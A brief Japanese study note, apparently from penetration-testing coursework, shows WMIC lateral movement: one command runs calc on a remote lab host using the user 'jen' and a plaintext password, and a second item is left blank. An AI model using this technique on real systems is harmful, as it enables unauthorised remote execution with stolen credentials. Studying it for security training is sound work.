# WMIC

1. /nodeで横展開用のターゲットを指定、/userでターゲットユーザを指定、/passwordでパスワードを指定、  
process call createで"calc"を指定して、電卓アプリケーションをターゲット上で起動する。  
ReturnValueで0が返ってくれば成功。jenユーザでcalcを実行してる。
```
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
```

2. 